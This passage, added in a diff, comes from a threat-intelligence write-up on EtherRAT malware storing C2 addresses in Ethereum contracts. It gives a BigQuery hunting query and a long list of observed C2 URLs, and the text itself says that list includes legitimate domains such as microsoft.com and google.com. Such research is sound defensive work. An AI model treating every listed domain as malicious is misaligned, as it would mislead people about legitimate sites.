+all_transactions AS (
+  SELECT
+    t.hash                                    AS tx_hash,
+    t.block_timestamp                         AS timestamp,
+    t.from_address                            AS caller_wallet,
+    t.to_address                              AS contract_address,
+    t.input                                   AS calldata,
+    LEFT(t.input, 10)                         AS function_selector,
+    CASE
+      WHEN LEFT(t.input, 10) = '0x7d434425' THEN 'READ_C2_URL'
+      WHEN LEFT(t.input, 10) = '0x7fcaf666' THEN 'WRITE_C2_URL'
+      ELSE 'OTHER'
+    END                                       AS action,
+    t.receipt_status                          AS success
+  FROM `bigquery-public-data.crypto_ethereum.transactions` t
+  WHERE t.to_address IN (SELECT address FROM etherrat_contracts)
+),
+
+-- Step 3: Extract C2 URLs from WRITE transactions
+c2_url_writes AS (
+  SELECT
+    tx_hash,
+    timestamp,
+    caller_wallet,
+    contract_address,
+    -- Skip selector (10 chars) + offset (64 chars) + length (64 chars) = 138 chars
+    SAFE.REGEXP_EXTRACT(calldata, r'^.{138}([0-9a-fA-F]+)') AS url_hex
+  FROM all_transactions
+  WHERE action = 'WRITE_C2_URL'
+    AND success = 1
+)
+
+SELECT
+  t.timestamp,
+  t.contract_address,
+  t.caller_wallet,
+  t.action,
+  t.tx_hash,
+  u.url_hex  -- decode this hex to UTF-8 externally
+FROM all_transactions t
+LEFT JOIN c2_url_writes u ON t.tx_hash = u.tx_hash
+ORDER BY t.timestamp ASC
+```
+
+</details>
+
+After decoding the hex URLs from the results, we get a long list of C2 servers used across all campaigns, including some legitimate domains that were likely used to blend in with normal traffic.
+
+<details>
+<summary>All observed C2 URLs (across all 74 contracts)</summary>
+
+```
+https://5ppljcs.microsoft.com, http://135.125.255.55, http://173.249.8.102,
+http://173.249.8.102/, http://193.233.126.94, http://91.215.85.42:3000,
+http://91.221.190.12, http://jariosos.com/, http://localhost,
+http://localhost:3000, https://1-microsoft.com, https://25936.microsoft.com,
+https://2_uchbr.microsoft.com, https://3chemas.microsoft.com,
+https://4apcnbr.microsoft.com, https://5ppljcs.microsoft.com,
+https://7w7.microsoft.com, https://9jaarenaxtra.com, https://aabstone.com,
+https://aad.microsoft.com, https://aadvisor-ppe.microsoft.com,
+https://abb.microsoft.com, https://abilitysummit.microsoft.com,
+https://abstract.microsoft.com, https://academic.microsoft.com,
+https://academicresearch.microsoft.com, https://academicverification.microsoft.com,
+https://acbb-ats-demo-eastus.microsoft.com,
+https://acbb-ats-eastus2-dev-1.microsoft.com,
+https://acbb-ats-eastus2-dev.microsoft.com,
+https://acbb-ats-westus2-dev-1.microsoft.com,
+https://accessreview-prod-dm3.microsoft.com, https://accont.microsoft.com,
+https://accouac.microsoft.com, https://action360-test.microsoft.com,
+https://adapted-marsh-ted-consultant.trycloudflare.com,
+https://advertising.microsoft.com, https://advocacy.microsoft.com,
+https://afford-effect-construct-tricks.trycloudflare.com, https://ager-stp.org,
+https://ahdaratlegalservices.com,
+https://allows-tennessee-latina-satisfied.trycloudflare.com,
+https://alphabet.com, https://ameenafshin.com, https://api-gateway-prod.com,
+https://api-gateway-softupdate.io,
+https://apparatus-contributions-understood-accommodation.trycloudflare.com,
+https://appstartlabs.com, https://array-armed-filling-whenever.trycloudflare.com,
+https://articlehaul.com, https://asked-herb-soup-diary.trycloudflare.com,
+https://associations-arrivals-cho-dare.trycloudflare.com,
+https://atagkeukentechniek.com, https://attempty.shop, https://audvidfisher.com,
+https://aurineuroth.com, https://bdstop.net, https://bermanlawrsk.com,
+https://boot-composer-paperbacks-viking.trycloudflare.com,
+https://brass-category-rocks-dakota.trycloudflare.com,
+https://breakbulkconf.com, https://cadlesr.biz,
+https://cakes-half-costa-movers.trycloudflare.com,
+https://caring-flush-objective-possibly.trycloudflare.com,
+https://carsaggregator.com, https://cdn42.octapie.com, https://cerumo.shop,
+https://charlyetmax.com, https://chjunhao.com,
+https://circus-proportion-weddings-ribbon.trycloudflare.com,
+https://codeframe.digital, https://codexa.best,
+https://commons-emperor-citysearch-huntington.trycloudflare.com,
+https://conditioning-freelance-norman-harrison.trycloudflare.com,
+https://constructed-star-proteins-gordon.trycloudflare.com,
+https://corp-embassy-finds-marked.trycloudflare.com,
+https://countries-automatically-movie-basin.trycloudflare.com,
+https://customise-event-charlotte-aqua.trycloudflare.com, https://databui.cfd,
+https://dealing-economics-enrollment-firms.trycloudflare.com,
+https://depot-reunion-listings-targets.trycloudflare.com,
+https://depretory.com, https://detailingoff.com, https://dev-microsoft.com,
+https://devarch.sbs, https://devsdiamonds.com, https://dmors.com,
+https://doclinebox.com, https://dreambigworkharddomore.com, https://dssence.net,
+https://egyptinfo.shop, https://essayajewelry.com, https://etlgme.club,
+https://euclidrent.com,
+https://europe-glance-rfc-expiration.trycloudflare.com,
+https://extended-king-tone-polar.trycloudflare.com, https://fastgamesltd.club,
+https://femsh.shop, https://ferry-unavailable-doom-lancaster.trycloudflare.com,
+https://festivals-cope-caps-consists.trycloudflare.com,
+https://fields-pct-easier-vancouver.trycloudflare.com,
+https://final-atomic-thank-references.trycloudflare.com, https://fluxnet.life,
+https://footballoff.com, https://ft.com, https://gateway001kir.com,
+https://globalwork.best, https://go.microsoft.com, https://google.com,
+https://grabify.link/SEFKGU,
+https://grabify.link/SEFKGU?dry87932wydes/fdsgdsfdsjfkl,
+https://greeting-lucia-investigator-inspector.trycloudflare.com,
+https://hayesmed.com, https://heel-exchange-emphasis-noon.trycloudflare.com,
+https://holes-connecting-sympathy-lyrics.trycloudflare.com,
+https://honorai.com, https://howto-tar-naturals-coordination.trycloudflare.com,
+https://htt-microsoft.com, https://icq-flooring-procedure-rap.trycloudflare.com,
+https://imported-spread-amplifier-chemicals.trycloudflare.com,
+https://inner-packets-everyday-climate.trycloudflare.com,
+https://insured-poker-concerts-discrete.trycloudflare.com,
+https://interpretation-event-grows-particle.trycloudflare.com,
+https://ipkdh.com, https://jariosos.com, https://johnguava.com,
+https://justtalken.com, https://kde-blink-buried-flower.trycloudflare.com,
+https://koleknor.com, https://laishishi.com,
+https://lambda-pee-promised-queries.trycloudflare.com,
+https://latina-cancellation-finances-specifications.trycloudflare.com,
+https://lauren-realtor-relaxation-playlist.trycloudflare.com,
+https://lbimuseum.org, https://lepaniermagic.com,
+https://lift-iowa-organic-eleven.trycloudflare.com, https://liltet.digital,
+https://logevents.club, https://logic-sampling-ist-anyone.trycloudflare.com,
+https://luminer.work, https://magazine-classics-miss-strengthen.trycloudflare.com,
+https://marketing-boss-league-excluding.trycloudflare.com,
+https://maslovdisign.com, https://mastluner.club, https://mbml-writer-info.info,
+https://mebeliotmasiv.com, https://mecmatica.digital,
+https://metric-complement-distributor-norman.trycloudflare.com,
+https://microsoft-tools.com, https://microsoft.co, https://microsoft.com,
+https://might-tribute-christina-vacuum.trycloudflare.com,
+https://millersteel.digital, https://mmdis-worls.com, https://moctate.shop,
+https://mode-exit-legendary-trusted.trycloudflare.com, https://mode.com,
+https://myloyaldoggy.com, https://mymexico.socia, https://mymexico.social,
+https://mymexico.social/, https://nastilka.com, https://ncdxbk.com,
+https://neutral-journalist-optimum-landscapes.trycloudflare.com,
+https://nevv-mmc.com, https://new--mmc.com, https://northcroft.digital,
+https://nsw-firewire-thumbnail-own.trycloudflare.com,
+https://nuvilifeglobal.com, https://o-parana.com, https://ocsp.digicert.com,
+https://okhash.org, https://oneocsp.microsoft.com, https://pagedit.shop,
+https://palshona.com,
+https://partnerships-imagine-dietary-footwear.trycloudflare.com,
+https://permission-resident-lots-ebooks.trycloudflare.com,
+https://peterson-assets-visible-secrets.trycloudflare.com,
+https://phrase-faculty-invision-cds.trycloudflare.com,
+https://pledge-herald-migration-interstate.trycloudflare.com,
+https://polyphonic-stephanie-athletes-experiments.trycloudflare.com,
+https://pontiac-green-season-wings.trycloudflare.com,
+https://pray-could-readily-inch.trycloudflare.com,
+https://profiles-zone-america-frankfurt.trycloudflare.com,
+https://publisherresolution.com, https://publisherresolution.com/,
+https://rapids-lil-lending-charleston.trycloudflare.com,
+https://regancontrols.com, https://relate-remember-blacks-tries.trycloudflare.com,
+https://remnett.shop, https://rencaihuainan.com,
+https://rna-artificial-colorado-brief.trycloudflare.com,
+https://robot-limitation-quarters-matthew.trycloudflare.com,
+https://routem.life, https://safely-specially-feeding-editorial.trycloudflare.com,
+https://salinasrent.com,
+https://scheduling-equations-supreme-cricket.trycloudflare.com,
+https://scooplacrosse.com, https://scott-spring-netscape-monica.trycloudflare.com,
+https://scsi-profession-table-estimated.trycloudflare.com,
+https://searches-christmas-egg-stable.trycloudflare.com,
+https://securities-bye-geometry-collective.trycloudflare.com,
+https://server.com, https://shelter-diesel-pavilion-intellectual.trycloudflare.com,
+https://sistemablackatz.com, https://sjrhs.org,
+https://software-changelog-clay-synthesis.trycloudflare.com,
+https://solidactivate.com,
+https://sports-progressive-rights-patch.trycloudflare.com, https://syhmen.com,
+https://syndication-trucks-trademarks-guarantees.trycloudflare.com,
+https://sysora.life, https://telecom-exceed-aid-charts.trycloudflare.com,
+https://terminal-labels-fan-witness.trycloudflare.com,
+https://threatened-handled-nylon-viewpicture.trycloudflare.com,
+https://thriftor.digital, https://tokio-sallys.net, https://tonverif.digital,
+https://tools.google.com, https://tranzed.org,
+https://travels-surround-edgar-counties.trycloudflare.com,
+https://true-presents-thereafter-und.trycloudflare.com, https://trust.com,
+https://twicegrand.com, https://uktaxiservice.com,
+https://vhs-portsmouth-automotive-fares.trycloudflare.com,
+https://village-forty-desktop-gale.trycloudflare.com,
+https://virtually-milwaukee-manuals-kits.trycloudflare.com,
+https://vmgarage.work, https://vstoki.com, https://w.com,
+https://wales-speeds-launches-healthcare.trycloudflare.com,
+https://wallpapers-centuries-pic-carnival.trycloudflare.com,
+https://washer-portrait-reflects-onion.trycloudflare.com,
+https://waygatterol002.com, https://web.com,
+https://when-architectural-cdna-faster.trycloudflare.com,
+https://witch-skins-lip-coal.trycloudflare.com, https://withbob.net,
+https://work.com, https://workshop-lighting-protective-customs.trycloudflare.com,
+https://wpuadmin.shop, https://yco.com, https://yuu-microsoft.com,
+https://zonasteni.com, mastluner.club, searchmscon.com
+```
+
+</details>
+
+---
+
+
+
+## References
+
+- [Atos: EtherRAT Distribution Spoofing Administrative Tools via GitHub Facades](https://atos.net/en/lp/cybershield/etherrat-distribution-spoofing-administrative-tools-via-github-facades)
+- [Sysdig: EtherRAT, Malware leveraging the Ethereum blockchain to remain undetected](https://sysdig.com/blog/etherrat/)
+- [heimdall-rs, EVM smart contract decompiler](https://github.com/Jon-Becker/heimdall-rs)
